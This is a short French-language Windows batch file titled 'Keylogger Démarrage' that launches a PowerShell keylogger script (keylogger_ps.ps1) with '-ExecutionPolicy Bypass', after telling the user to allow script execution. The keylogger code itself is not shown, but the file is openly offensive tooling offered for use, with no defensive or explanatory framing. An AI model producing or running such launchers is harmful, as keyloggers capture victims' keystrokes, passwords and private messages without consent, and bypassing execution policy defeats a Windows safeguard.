@echo off
title Keylogger Démarrage
color 0A

echo [1] Démarrage du Keylogger natif PowerShell...
echo [2] Veuillez autoriser l'execution du script si Windows le demande.
echo.

:: Lancement du script PowerShell avec politique de contournement
powershell.exe -ExecutionPolicy Bypass -File keylogger_ps.ps1

pause
